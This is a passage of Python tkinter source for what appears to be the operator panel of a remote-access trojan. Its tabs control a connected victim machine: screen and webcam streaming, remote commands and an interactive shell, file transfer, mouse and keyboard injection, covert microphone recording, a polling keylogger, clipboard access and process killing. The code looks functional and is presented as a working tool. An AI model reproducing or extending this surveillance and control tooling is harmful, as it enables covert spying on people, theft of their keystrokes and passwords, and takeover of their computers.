        if self.dev.connected:
            self.dev.close_ws()
            self._status("Disconnected", C_RED)
            self._shell_is_active = False
            self.stream_active = False
            self.screen_active = False
            return
        self.dev.close_ws()
        while not self.dev.msg_queue.empty():
            try:
                self.dev.msg_queue.get_nowait()
            except queue.Empty:
                break
        if self.dev.loop and not self.dev.loop.is_closed():
            try:
                self.dev.loop.call_soon_threadsafe(self.dev.loop.stop)
            except Exception:
                pass
        self.dev.connect_async()
        self._status("Connecting...", C_ORANGE)
        threading.Thread(target=self._wait_conn, daemon=True).start()

    def _wait_conn(self):
        ok = self.dev.wait_connected()
        if ok:
            self.root.after(0, lambda: self._status(self.dev.name + " connected", C_GREEN))
        else:
            self.root.after(0, lambda: self._status("Failed", C_RED))
            self.root.after(0, lambda: messagebox.showerror("Connection", "Failed to connect"))

    def _status(self, text, color):
        self.status_bar.configure(text=text, fg=color)

    def _on_ping(self):
        if not self._check_conn():
            return
        ms = self.dev.ping()
        if ms is not None:
            self.lat_var.set("Lat: %dms" % int(ms))
        else:
            self.lat_var.set("Lat: timeout")

    def _on_update(self):
        if not self._check_conn():
            return
        UpdateDialog(self.root, self.dev)

    # ──── tabs ────
    def _build_tabs(self):
        nb = ttk.Notebook(self.root)
        nb.pack(fill="both", expand=True, padx=5, pady=5)

        self.tabs = {}
        for name in ["Screenshot", "ScreenStream", "Camera", "Commands", "Shell", "Files", "Input", "Dictaphone", "Keylog", "System"]:
            frm = tk.Frame(nb, bg=C_SURFACE)
            nb.add(frm, text=name)
            self.tabs[name] = frm

        self._tab_ss()
        self._tab_screen_stream()
        self._tab_cam()
        self._tab_cmd()
        self._tab_shell()
        self._tab_files()
        self._tab_input()
        self._tab_dict()
        self._tab_keylog()
        self._tab_sys()

    # Screenshot
    def _tab_ss(self):
        tab = self.tabs["Screenshot"]
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=15, pady=8)
        mlabel(ctrl, "Quality:").pack(side="left", padx=(0, 4))
        self.ss_qual = ttk.Scale(ctrl, from_=10, to=100, value=80, orient="horizontal", length=200)
        self.ss_qual.pack(side="left", padx=(0, 8))
        self.ss_qual_lbl = mlabel(ctrl, "80")
        self.ss_qual_lbl.pack(side="left")
        self.ss_qual.configure(command=lambda v: self.ss_qual_lbl.configure(text=str(int(float(v)))))
        mbtn(ctrl, "Take Screenshot", self._on_ss).pack(side="left", padx=6)
        self.ss_info = mlabel(tab, "[screenshot will appear]", fg=C_FG_DIM)
        self.ss_info.pack(pady=15)

    def _on_ss(self):
        if not self._check_conn(): return
        q = int(self.ss_qual.get())
        threading.Thread(target=self._do_ss, args=(q,), daemon=True).start()

    def _do_ss(self, q):
        data = self.dev.screenshot(q)
        if data:
            txt = str(data["width"]) + "x" + str(data["height"])
            b64 = data["image_b64"]
            self.root.after(0, lambda: self.ss_info.configure(text=txt))
            self.root.after(0, lambda: show_image_in_window(b64))
        else:
            self.root.after(0, lambda: self.ss_info.configure(text="Failed"))

    # Screen Stream
    def _tab_screen_stream(self):
        tab = self.tabs["ScreenStream"]
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=15, pady=8)
        mlabel(ctrl, "FPS:").pack(side="left", padx=(0, 4))
        self.ss_fps = ttk.Entry(ctrl, width=5)
        self.ss_fps.insert(0, "5")
        self.ss_fps.pack(side="left", padx=(0, 8))
        mlabel(ctrl, "Q:").pack(side="left", padx=(0, 4))
        self.ss_qual2 = ttk.Scale(ctrl, from_=10, to=100, value=70, orient="horizontal", length=150)
        self.ss_qual2.pack(side="left", padx=(0, 8))
        self.ss_qual2_lbl = mlabel(tab, "70")
        self.ss_qual2_lbl.pack(side="left")
        self.ss_qual2.configure(command=lambda v: self.ss_qual2_lbl.configure(text=str(int(float(v)))))
        self.screen_btn = mbtn(ctrl, "Start", self._on_screen_toggle)
        self.screen_btn.pack(side="left", padx=6)
        self.screen_st = mlabel(tab, "[screen stream]", fg=C_FG_DIM)
        self.screen_st.pack(pady=4)
        cf = tk.Frame(tab, bg=C_BG, relief="sunken", bd=2)
        cf.pack(fill="both", expand=True, padx=15, pady=10)
        self.screen_cv = tk.Canvas(cf, bg=C_BG, width=800, height=500)
        self.screen_cv.pack(fill="both", expand=True, padx=4, pady=4)

    def _on_screen_toggle(self):
        if not self._check_conn(): return
        if not self.screen_active:
            fps = int(self.ss_fps.get())
            q = int(self.ss_qual2.get())
            self.dev.screen_start(fps=fps, quality=q)
            self.screen_active = True
            self.screen_btn.configure(text="Stop")
            self.screen_st.configure(text="Streaming screen at " + str(fps) + " fps")
        else:
            self.dev.screen_stop()
            self.screen_active = False
            self.screen_btn.configure(text="Start")
            self.screen_st.configure(text="[Stream stopped]")

    def _display_screen_frame(self, frame_b64, w, h):
        try:
            raw = base64.b64decode(frame_b64)
            img = Image.open(io.BytesIO(raw))
            cw = self.screen_cv.winfo_width()
            ch = self.screen_cv.winfo_height()
            if cw <= 1: cw = 800
            if ch <= 1: ch = 500
            img = img.resize((cw, ch), Image.Resampling.LANCZOS)
            self.cam_photo = ImageTk.PhotoImage(img)
            self.screen_cv.create_image(0, 0, anchor="nw", image=self.cam_photo)
        except Exception:
            pass

    # Camera
    def _tab_cam(self):
        tab = self.tabs["Camera"]
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=15, pady=8)
        mlabel(ctrl, "Cam:").pack(side="left", padx=(0, 4))
        self.cam_idx = ttk.Combobox(ctrl, values=["0", "1", "2"], width=4, state="readonly")
        self.cam_idx.set("0")
        self.cam_idx.pack(side="left", padx=8)
        mlabel(ctrl, "FPS:").pack(side="left", padx=4)
        self.cam_fps_e = ttk.Entry(ctrl, width=4)
        self.cam_fps_e.insert(0, "10")
        self.cam_fps_e.pack(side="left", padx=8)
        self.cam_btn = mbtn(ctrl, "Start", self._on_cam_toggle)
        self.cam_btn.pack(side="left", padx=6)
        self.cam_st = mlabel(tab, "[camera]", fg=C_FG_DIM)
        self.cam_st.pack(pady=4)
        cf = tk.Frame(tab, bg=C_BG, relief="sunken", bd=2)
        cf.pack(fill="both", expand=True, padx=15, pady=10)
        self.cam_cv = tk.Canvas(cf, bg=C_BG, width=640, height=480)
        self.cam_cv.pack(fill="both", expand=True, padx=4, pady=4)

    def _on_cam_toggle(self):
        if not self._check_conn(): return
        if not self.stream_active:
            fps = int(self.cam_fps_e.get())
            self.dev.camera_index = int(self.cam_idx.get())
            self.dev.stream_start(fps=fps)
            self.stream_active = True
            self.cam_btn.configure(text="Stop")
            self.cam_st.configure(text="Streaming camera #" + self.cam_idx.get())
        else:
            self.dev.stream_stop()
            self.stream_active = False
            self.cam_btn.configure(text="Start")
            self.cam_st.configure(text="[Stopped]")

    def _display_cam_frame(self, frame_b64):
        try:
            raw = base64.b64decode(frame_b64)
            img = Image.open(io.BytesIO(raw))
            cw = self.cam_cv.winfo_width()
            ch = self.cam_cv.winfo_height()
            if cw <= 1: cw = 640
            if ch <= 1: ch = 480
            img = img.resize((cw, ch), Image.Resampling.LANCZOS)
            self.cam_photo = ImageTk.PhotoImage(img)
            self.cam_cv.create_image(0, 0, anchor="nw", image=self.cam_photo)
        except Exception:
            pass

    # Commands
    def _tab_cmd(self):
        tab = self.tabs["Commands"]
        top = tk.Frame(tab, bg=C_SURFACE)
        top.pack(fill="x", padx=15, pady=8)
        mlabel(top, "$ ", fg=C_ACCENT, font=("Consolas", 11)).pack(side="left")
        self.cmd_e = ttk.Entry(top, width=70)
        self.cmd_e.pack(side="left", fill="x", expand=True, padx=4)
        self.cmd_e.bind("<Return>", lambda e: self._on_exec())
        mbtn(top, "Run", self._on_exec).pack(side="left")
        mlabel(top, " Sudo:").pack(side="left", padx=(8, 2))
        self.sudo_pw_e = ttk.Entry(top, width=14, show="*")
        self.sudo_pw_e.pack(side="left", padx=2)
        self.cmd_out = mbox(tab, height=20)
        self.cmd_out.pack(fill="both", expand=True, padx=15, pady=8)

    def _on_exec(self):
        if not self._check_conn(): return
        cmd = self.cmd_e.get().strip()
        if not cmd: return
        sudo_pw = self.sudo_pw_e.get().strip() or None
        threading.Thread(target=self._do_exec, args=(cmd, sudo_pw), daemon=True).start()

    def _do_exec(self, cmd, sudo_password=None):
        r = self.dev.exec_cmd(cmd, sudo_password=sudo_password)
        out = "$ " + cmd + "\n" + r.get("stdout", "")
        if r.get("stderr"):
            out += "\n[STDERR]\n" + r["stderr"]
        if r.get("needs_sudo_password"):
            out += "\n⚠ SUDO requires password — enter it in 'Sudo' field and re-run"
        out += "\n[Exit: " + str(r.get("returncode", "?")) + "]\n" + "-" * 60 + "\n"
        self.root.after(0, lambda: mappend(self.cmd_out, out))

    # Shell
    def _tab_shell(self):
        tab = self.tabs["Shell"]
        top = tk.Frame(tab, bg=C_SURFACE)
        top.pack(fill="x", padx=15, pady=8)
        mbtn(top, "Open", self._on_shell_open).pack(side="left", padx=3)
        mbtn(top, "Close", self._on_shell_close).pack(side="left", padx=3)
        self.shell_st = mlabel(top, "[Closed]", fg=C_FG_DIM)
        self.shell_st.pack(side="left", padx=10)
        self.shell_out = mbox(tab, height=20)
        self.shell_out.pack(fill="both", expand=True, padx=15, pady=6)
        inp = tk.Frame(tab, bg=C_SURFACE)
        inp.pack(fill="x", padx=15, pady=6)
        mlabel(inp, "$ ", fg=C_ACCENT, font=("Consolas", 11)).pack(side="left")
        self.shell_e = ttk.Entry(inp, width=70)
        self.shell_e.pack(side="left", fill="x", expand=True, padx=4)
        self.shell_e.bind("<Return>", lambda e: self._on_shell_send())

    def _on_shell_open(self):
        if not self._check_conn(): return
        self.dev.open_shell()
        self._shell_is_active = True
        self.shell_st.configure(text="[Open]", fg=C_GREEN)
        mappend(self.shell_out, "\n[Shell opened]\n")

    def _on_shell_send(self):
        if not self._check_conn() or not self._shell_is_active: return
        data = self.shell_e.get()
        if not data: return
        self.shell_e.delete(0, "end")
        mappend(self.shell_out, "> " + data + "\n")
        self.dev.shell_input(data)
        out = self.dev.shell_output_wait(timeout=3)
        if out:
            self.root.after(0, lambda: mappend(self.shell_out, out))

    def _on_shell_close(self):
        if not self._check_conn(): return
        self.dev.close_shell()
        self._shell_is_active = False
        self.shell_st.configure(text="[Closed]", fg=C_FG_DIM)
        mappend(self.shell_out, "\n[Shell closed]\n")

    # Files
    def _tab_files(self):
        tab = self.tabs["Files"]
        mlabel(tab, "Send:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
        sf = tk.Frame(tab, bg=C_SURFACE)
        sf.pack(fill="x", padx=15, pady=4)
        self.sl_lbl = mlabel(sf, "[no file]", fg=C_FG_DIM)
        self.sl_lbl.pack(side="left", padx=4)
        mbtn(sf, "Browse", self._browse_send).pack(side="left", padx=4)
        mbtn(sf, "Send", self._do_send).pack(side="left", padx=4)

        mlabel(tab, "Get:", font=("Segoe UI", 10, "bold")).pack(anchor="w", padx=15, pady=(8, 4))
        rf = tk.Frame(tab, bg=C_SURFACE)
        rf.pack(fill="x", padx=15, pady=4)
        mlabel(rf, "Remote:").pack(side="left", padx=4)
        self.rr_e = ttk.Entry(rf, width=25)
        self.rr_e.pack(side="left", padx=4)
        mlabel(rf, "Local:").pack(side="left", padx=(8, 4))
        self.rl_e = ttk.Entry(rf, width=25)
        self.rl_e.pack(side="left", padx=4)
        mbtn(rf, "Receive", self._do_recv).pack(side="left", padx=4)

        self.f_log = mbox(tab, height=12)
        self.f_log.pack(fill="x", padx=15, pady=6)

    def _log_file(self, msg):
        mappend(self.f_log, "[" + time.strftime("%H:%M:%S") + "] " + msg + "\n")

    def _browse_send(self):
        p = filedialog.askopenfilename()
        if p:
            self.send_local_path = p
            self.sl_lbl.configure(text=os.path.basename(p))

    def _do_send(self):
        if not self._check_conn(): return
        if not self.send_local_path:
            messagebox.showinfo("Send", "Select file")
            return
        threading.Thread(target=self._do_send_bg, args=(self.send_local_path, self.sl_lbl.cget("text")), daemon=True).start()

    def _do_send_bg(self, lp, rp):
        ok, msg = self.dev.send_file(lp, rp)
        self.root.after(0, lambda: self._log_file(msg))

    def _do_recv(self):
        if not self._check_conn(): return
        rp = self.rr_e.get().strip()
        lp = self.rl_e.get().strip() or os.path.expanduser("~")
        threading.Thread(target=self._do_recv_bg, args=(rp, lp), daemon=True).start()

    def _do_recv_bg(self, rp, lp):
        ok, msg = self.dev.recv_file(rp, lp)
        self.root.after(0, lambda: self._log_file(msg))

    # ──── Input (Mouse + Keyboard) ────
    def _tab_input(self):
        tab = self.tabs["Input"]

        nb = ttk.Notebook(tab)
        nb.pack(fill="both", expand=True, padx=5, pady=5)

        mouse_tab = tk.Frame(nb, bg=C_SURFACE)
        kb_tab = tk.Frame(nb, bg=C_SURFACE)
        nb.add(mouse_tab, text="Mouse")
        nb.add(kb_tab, text="Keyboard")

        self._build_mouse_tab(mouse_tab)
        self._build_kb_tab(kb_tab)

    def _build_mouse_tab(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl, "X:").pack(side="left", padx=2)
        self.mouse_x = ttk.Entry(ctrl, width=6)
        self.mouse_x.insert(0, "500")
        self.mouse_x.pack(side="left", padx=2)

        mlabel(ctrl, "Y:").pack(side="left", padx=2)
        self.mouse_y = ttk.Entry(ctrl, width=6)
        self.mouse_y.insert(0, "300")
        self.mouse_y.pack(side="left", padx=2)

        mbtn(ctrl, "Move", self._on_mouse_move).pack(side="left", padx=4)
        mbtn(ctrl, "Move Relative", self._on_mouse_move_rel).pack(side="left", padx=4)

        ctrl2 = tk.Frame(tab, bg=C_SURFACE)
        ctrl2.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl2, "Button:").pack(side="left", padx=2)
        self.mouse_btn = ttk.Combobox(ctrl2, values=["left", "right", "middle"], width=8, state="readonly")
        self.mouse_btn.set("left")
        self.mouse_btn.pack(side="left", padx=2)

        mlabel(ctrl2, "Clicks:").pack(side="left", padx=2)
        self.mouse_clicks = ttk.Entry(ctrl2, width=4)
        self.mouse_clicks.insert(0, "1")
        self.mouse_clicks.pack(side="left", padx=2)

        mbtn(ctrl2, "Click", self._on_mouse_click).pack(side="left", padx=4)

        ctrl3 = tk.Frame(tab, bg=C_SURFACE)
        ctrl3.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl3, "Scroll Y:").pack(side="left", padx=2)
        self.scroll_dy = ttk.Entry(ctrl3, width=5)
        self.scroll_dy.insert(0, "3")
        self.scroll_dy.pack(side="left", padx=2)

        mbtn(ctrl3, "Scroll", self._on_mouse_scroll).pack(side="left", padx=4)

        self.mouse_log = mbox(tab, height=10)
        self.mouse_log.pack(fill="both", expand=True, padx=10, pady=4)

    def _on_mouse_move(self):
        if not self._check_conn(): return
        try:
            x = int(self.mouse_x.get())
            y = int(self.mouse_y.get())
        except ValueError:
            return
        threading.Thread(target=lambda: self.dev.mouse_move(x, y), daemon=True).start()

    def _on_mouse_move_rel(self):
        if not self._check_conn(): return
        try:
            x = int(self.mouse_x.get())
            y = int(self.mouse_y.get())
        except ValueError:
            return
        threading.Thread(target=lambda: self.dev.mouse_move(x, y, relative=True), daemon=True).start()

    def _on_mouse_click(self):
        if not self._check_conn(): return
        try:
            x = int(self.mouse_x.get())
            y = int(self.mouse_y.get())
        except ValueError:
            x = y = None
        btn = self.mouse_btn.get()
        try:
            clicks = int(self.mouse_clicks.get())
        except ValueError:
            clicks = 1
        threading.Thread(target=lambda: self.dev.mouse_click(x, y, btn, clicks), daemon=True).start()

    def _on_mouse_scroll(self):
        if not self._check_conn(): return
        try:
            dy = int(self.scroll_dy.get())
        except ValueError:
            dy = 3
        threading.Thread(target=lambda: self.dev.mouse_scroll(dy=dy), daemon=True).start()

    def _build_kb_tab(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl, "Text:").pack(side="left", padx=2)
        self.kb_text = ttk.Entry(ctrl, width=40)
        self.kb_text.pack(side="left", padx=2)
        mbtn(ctrl, "Type", self._on_kb_type).pack(side="left", padx=4)

        ctrl2 = tk.Frame(tab, bg=C_SURFACE)
        ctrl2.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl2, "Hotkey:").pack(side="left", padx=2)
        self.kb_hotkey = ttk.Entry(ctrl2, width=20)
        self.kb_hotkey.insert(0, "ctrl+c")
        self.kb_hotkey.pack(side="left", padx=2)
        mbtn(ctrl2, "Send", self._on_kb_hotkey).pack(side="left", padx=4)

        ctrl3 = tk.Frame(tab, bg=C_SURFACE)
        ctrl3.pack(fill="x", padx=10, pady=6)

        mlabel(ctrl3, "Key:").pack(side="left", padx=2)
        self.kb_key = ttk.Entry(ctrl3, width=15)
        self.kb_key.insert(0, "enter")
        self.kb_key.pack(side="left", padx=2)
        mbtn(ctrl3, "Press", self._on_kb_press).pack(side="left", padx=4)

        quick = tk.Frame(tab, bg=C_SURFACE)
        quick.pack(fill="x", padx=10, pady=4)
        for label, key in [("Enter", "enter"), ("Tab", "tab"), ("Esc", "escape"),
                           ("Win", "win"), ("Alt+F4", None), ("Ctrl+A", None),
                           ("Ctrl+C", None), ("Ctrl+V", None), ("Win+R", None)]:
            if key:
                mbtn(quick, label, lambda k=key: self._quick_press(k), width=8).pack(side="left", padx=2)
            else:
                keys_map = {"Alt+F4": ["alt", "f4"], "Ctrl+A": ["ctrl", "a"],
                            "Ctrl+C": ["ctrl", "c"], "Ctrl+V": ["ctrl", "v"],
                            "Win+R": ["win", "r"]}
                k = keys_map.get(label)
                if k:
                    mbtn(quick, label, lambda ks=k: self._quick_hotkey(ks), width=8).pack(side="left", padx=2)

        self.kb_log = mbox(tab, height=12)
        self.kb_log.pack(fill="both", expand=True, padx=10, pady=4)

    def _on_kb_type(self):
        if not self._check_conn(): return
        text = self.kb_text.get()
        if not text: return
        threading.Thread(target=lambda: self.dev.keyboard_type(text), daemon=True).start()

    def _on_kb_hotkey(self):
        if not self._check_conn(): return
        hk = self.kb_hotkey.get().strip()
        if not hk: return
        keys = hk.split("+")
        threading.Thread(target=lambda: self.dev.keyboard_hotkey(keys), daemon=True).start()

    def _on_kb_press(self):
        if not self._check_conn(): return
        key = self.kb_key.get().strip()
        if not key: return
        threading.Thread(target=lambda: self.dev.keyboard_press(key), daemon=True).start()

    def _quick_press(self, key):
        if not self._check_conn(): return
        threading.Thread(target=lambda: self.dev.keyboard_press(key), daemon=True).start()

    def _quick_hotkey(self, keys):
        if not self._check_conn(): return
        threading.Thread(target=lambda: self.dev.keyboard_hotkey(keys), daemon=True).start()

    # ──── Dictaphone ────
    def _tab_dict(self):
        tab = self.tabs["Dictaphone"]
        
        self.dict_tab = tab
        
        # Top control bar
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=15, pady=10)
        
        mlabel(ctrl, "Duration (sec, 0=∞):", fg=C_FG_DIM).pack(side="left", padx=(0, 5))
        self.audio_dur = ttk.Entry(ctrl, width=6)
        self.audio_dur.insert(0, "0")
        self.audio_dur.pack(side="left", padx=4)
        
        self.audio_rec_btn = mbtn(ctrl, "● REC", self._on_audio_toggle)
        self.audio_rec_btn.pack(side="left", padx=15)
        self.audio_rec_btn.config(style="Red.TButton")
        
        # Timer label
        self.audio_timer = mlabel(ctrl, "00:00", fg=C_FG_DIM, font=("Consolas", 14, "bold"))
        self.audio_timer.pack(side="right", padx=10)
        
        self.audio_status = mlabel(ctrl, "Idle", fg=C_FG_DIM)
        self.audio_status.pack(side="right", padx=(0, 15))
        
        # Recordings list
        list_frame = tk.Frame(tab, bg=C_SURFACE)
        list_frame.pack(fill="both", expand=True, padx=15, pady=6)
        
        cols = ("name", "size", "actions")
        self.audio_tree = ttk.Treeview(list_frame, columns=cols, show="headings", selectmode="browse", height=12)
        self.audio_tree.heading("name", text="Filename")
        self.audio_tree.heading("size", text="Size")
        self.audio_tree.heading("actions", text="Actions")
        self.audio_tree.column("name", width=350)
        self.audio_tree.column("size", width=100, anchor="e")
        self.audio_tree.column("actions", width=220, anchor="center")
        
        vsb = ttk.Scrollbar(list_frame, orient="vertical", command=self.audio_tree.yview)
        self.audio_tree.configure(yscrollcommand=vsb.set)
        
        self.audio_tree.pack(side="left", fill="both", expand=True)
        vsb.pack(side="right", fill="y")
        
        # Double-click to open action menu
        self.audio_tree.bind("<Double-1>", self._on_audio_tree_dblclick)
        
        # Bottom action bar
        act = tk.Frame(tab, bg=C_SURFACE)
        act.pack(fill="x", padx=15, pady=6)
        
        self.btn_refresh = mbtn(act, "↻ Refresh", self._on_audio_list)
        self.btn_refresh.pack(side="left", padx=4)
        
        self.btn_download = mbtn(act, "↓ Download selected", self._on_audio_download)
        self.btn_download.pack(side="left", padx=4)
        
        self.btn_delete_sel = mbtn(act, "✕ Delete selected", self._on_audio_delete)
        self.btn_delete_sel.pack(side="left", padx=4)
        
        self.btn_delete_all = mbtn(act, "✕ Delete all", self._on_audio_delete_all)
        self.btn_delete_all.pack(side="left", padx=4)
        
        self._timer_job = None
        self._rec_start_time = None

    def _start_timer(self):
        self._rec_start_time = time.time()
        self._update_timer()

    def _update_timer(self):
        if self._rec_start_time and self.recording:
            elapsed = int(time.time() - self._rec_start_time)
            mins, secs = divmod(elapsed, 60)
            hrs, mins = divmod(mins, 60)
            if hrs > 0:
                self.audio_timer.configure(text=f"{hrs:02d}:{mins:02d}:{secs:02d}", fg=C_RED)
            else:
                self.audio_timer.configure(text=f"{mins:02d}:{secs:02d}", fg=C_RED)
            self._timer_job = self.root.after(1000, self._update_timer)

    def _stop_timer(self):
        if self._timer_job:
            self.root.after_cancel(self._timer_job)
            self._timer_job = None
        self._rec_start_time = None
        self.audio_timer.configure(text="00:00", fg=C_FG_DIM)

    def _on_audio_tree_dblclick(self, event):
        region = self.audio_tree.identify("region", event.x, event.y)
        if region == "cell":
            col = self.audio_tree.identify_column(event.x)
            if col == "#3":  # Actions column
                sel = self.audio_tree.selection()
                if sel:
                    self._show_audio_actions(sel[0])

    def _show_audio_actions(self, item_id):
        item = self.audio_tree.item(item_id)
        name = item["values"][0]
        menu = tk.Menu(self.root, tearoff=0, bg=C_SURFACE, fg=C_FG, font=("Segoe UI", 9))
        menu.add_command(label="↓ Download", command=lambda: self._on_audio_download_single(name))
        menu.add_command(label="✕ Delete", command=lambda: self._on_audio_delete_single(name))
        try:
            menu.tk_popup(self.root.winfo_pointerx(), self.root.winfo_pointery())
        finally:
            menu.grab_release()

    def _on_audio_download_single(self, name):
        sd = filedialog.askdirectory()
        if not sd: return
        self.audio_status.configure(text="Downloading...", fg=C_ORANGE)
        threading.Thread(target=self._do_audio_dl, args=(name, sd), daemon=True).start()

    def _on_audio_delete_single(self, name):
        if messagebox.askyesno("Delete", f"Delete recording {name}?"):
            self.dev.audio_delete(name=name)
            self._on_audio_list()

    def _on_audio_toggle(self):
        if not self._check_conn(): return
        if not self.recording:
            try:
                dur = int(self.audio_dur.get())
            except ValueError:
                dur = 0
            d = self.dev.audio_start(duration=dur if dur > 0 else None)
            if d and d.get("status") == "started":
                self.recording = True
                self.audio_rec_btn.configure(text="■ Stop")
                self.audio_status.configure(text="Recording...", fg=C_RED)
                self._start_timer()
            else:
                self.audio_status.configure(text="Failed: " + str(d.get("message", "")), fg=C_RED)
        else:
            self.dev.audio_stop()
            self.recording = False
            self.audio_rec_btn.configure(text="● REC")
            self.audio_status.configure(text="Stopped", fg=C_GREEN)
            self._stop_timer()

    def _on_audio_list(self):
        if not self._check_conn(): return
        for i in self.audio_tree.get_children():
            self.audio_tree.delete(i)
        recs = self.dev.audio_list_data()
        if not recs:
            return
        for r in recs:
            size_kb = r["size"] / 1024 if r["size"] < 1024*1024 else r["size"] / (1024*1024)
            size_str = f"{size_kb:.0f} MB" if r["size"] >= 1024*1024 else f"{size_kb:.1f} KB"
            ts = r["name"].replace("rec_", "").split("_")[0]  # Extract date
            date_str = ts[:4] + "-" + ts[4:6] + "-" + ts[6:] if len(ts) >= 8 else "unknown"
            self.audio_tree.insert("", "end", values=(r["name"], size_str, f"↓ / ✕"))

    def _on_audio_download(self):
        if not self._check_conn(): return
        sel = self.audio_tree.selection()
        if not sel:
            messagebox.showinfo("Download", "Select a recording")
            return
        item = self.audio_tree.item(sel[0])
        name = item["values"][0]
        sd = filedialog.askdirectory()
        if not sd: return
        self.audio_status.configure(text="Downloading...", fg=C_ORANGE)
        threading.Thread(target=self._do_audio_dl, args=(name, sd), daemon=True).start()

    def _do_audio_dl(self, name, sd):
        ok, msg = self.dev.audio_download(name, sd)
        self.root.after(0, lambda: self.audio_status.configure(text=msg, fg=C_GREEN if ok else C_RED))

    def _on_audio_delete(self):
        if not self._check_conn(): return
        sel = self.audio_tree.selection()
        if not sel: return
        item = self.audio_tree.item(sel[0])
        name = item["values"][0]
        if messagebox.askyesno("Delete", name + "?"):
            self.dev.audio_delete(name=name)
            self._on_audio_list()

    def _on_audio_delete_all(self):
        if not self._check_conn(): return
        if messagebox.askyesno("Delete all", "Delete all recordings?"):
            self.dev.audio_delete()
            for i in self.audio_tree.get_children():
                self.audio_tree.delete(i)
            self.audio_status.configure(text="All deleted", fg=C_GREEN)

    # Keylog
    def _tab_keylog(self):
        tab = self.tabs["Keylog"]
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=15, pady=10)
        mbtn(ctrl, "Start", self._kl_start).pack(side="left", padx=3)
        mbtn(ctrl, "Stop", self._kl_stop).pack(side="left", padx=3)
        mbtn(ctrl, "Get Log", self._kl_get).pack(side="left", padx=3)
        self.kl_auto_btn = mbtn(ctrl, "Auto", self._kl_auto)
        self.kl_auto_btn.pack(side="left", padx=3)
        self.kl_out = mbox(tab, height=26)
        self.kl_out.pack(fill="both", expand=True, padx=15, pady=8)

    def _kl_start(self):
        if not self._check_conn(): return
        s = self.dev.keylog_start()
        mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] Started: " + s + "\n")

    def _kl_stop(self):
        if not self._check_conn(): return
        s = self.dev.keylog_stop()
        mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] Stopped: " + s + "\n")

    def _kl_get(self):
        if not self._check_conn(): return
        d = self.dev.keylog_get()
        txt = d.get("data", "")
        if txt:
            mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] (" + str(len(txt)) + " chars):\n" + txt + "\n" + "-" * 60 + "\n")
        else:
            mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] Empty\n")

    def _kl_auto(self):
        if not self._check_conn(): return
        if not self.keylog_auto_running:
            self.keylog_auto_running = True
            self.dev.keylog_start()
            mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] Auto ON\n")
            self.kl_auto_btn.configure(text="Stop Auto")
            threading.Thread(target=self._kl_auto_loop, daemon=True).start()
        else:
            self.keylog_auto_running = False
            self.dev.keylog_stop()
            mappend(self.kl_out, "[" + time.strftime("%H:%M:%S") + "] Auto OFF\n")
            self.kl_auto_btn.configure(text="Auto")

    def _kl_auto_loop(self):
        while self.keylog_auto_running and self.dev and self.dev.connected:
            d = self.dev.keylog_get()
            txt = d.get("data", "")
            if txt:
                ts = time.strftime("%H:%M:%S")
                self.root.after(0, lambda t=txt, s=ts: mappend(self.kl_out, "[" + s + "] " + t + "\n"))
            time.sleep(10)

    # System
    def _tab_sys(self):
        tab = self.tabs["System"]

        nb = ttk.Notebook(tab)
        nb.pack(fill="both", expand=True, padx=5, pady=5)

        info_tab = tk.Frame(nb, bg=C_SURFACE)
        proc_tab = tk.Frame(nb, bg=C_SURFACE)
        fs_tab = tk.Frame(nb, bg=C_SURFACE)
        clip_tab = tk.Frame(nb, bg=C_SURFACE)
        manage_tab = tk.Frame(nb, bg=C_SURFACE)

        nb.add(info_tab, text="Info")
        nb.add(proc_tab, text="Processes")
        nb.add(fs_tab, text="Files")
        nb.add(clip_tab, text="Clipboard")
        nb.add(manage_tab, text="Manage")

        self._build_sys_info(info_tab)
        self._build_sys_proc(proc_tab)
        self._build_sys_fs(fs_tab)
        self._build_sys_clip(clip_tab)
        self._build_sys_manage(manage_tab)

    def _build_sys_info(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)
        mbtn(ctrl, "Refresh", self._on_sysinfo).pack(side="left", padx=4)
        self.sysinfo_box = mbox(tab, height=20)
        self.sysinfo_box.pack(fill="both", expand=True, padx=10, pady=4)

    def _on_sysinfo(self):
        if not self._check_conn(): return
        threading.Thread(target=self._do_sysinfo, daemon=True).start()

    def _do_sysinfo(self):
        info = self.dev.sysinfo()
        if not info:
            self.root.after(0, lambda: mappend(self.sysinfo_box, "No response\n"))
            return
        lines = ["=== System Info ==="]
        for k, v in info.items():
            if k == "ip":
                continue
            lines.append(f"  {k}: {v}")
        self.root.after(0, lambda: (mclear(self.sysinfo_box), mappend(self.sysinfo_box, "\n".join(lines))))

    def _build_sys_proc(self, tab):
        ctrl = tk.Frame(tab, bg=C_SURFACE)
        ctrl.pack(fill="x", padx=10, pady=6)
        mbtn(ctrl, "Refresh", self._on_proc_refresh).pack(side="left", padx=4)
        mlabel(ctrl, "Kill:").pack(side="left", padx=(8, 2))
        self.kill_e = ttk.Entry(ctrl, width=12)
        self.kill_e.pack(side="left", padx=2)
        mbtn(ctrl, "Kill", self._on_proc_kill).pack(side="left", padx=4)

        cols = ("pid", "name", "cpu", "mem", "status")
        self.proc_tree = ttk.Treeview(tab, columns=cols, show="headings", height=20)
        self.proc_tree.heading("pid", text="PID")
        self.proc_tree.heading("name", text="Name")
        self.proc_tree.heading("cpu", text="CPU%")
        self.proc_tree.heading("mem", text="MEM%")
        self.proc_tree.heading("status", text="Status")
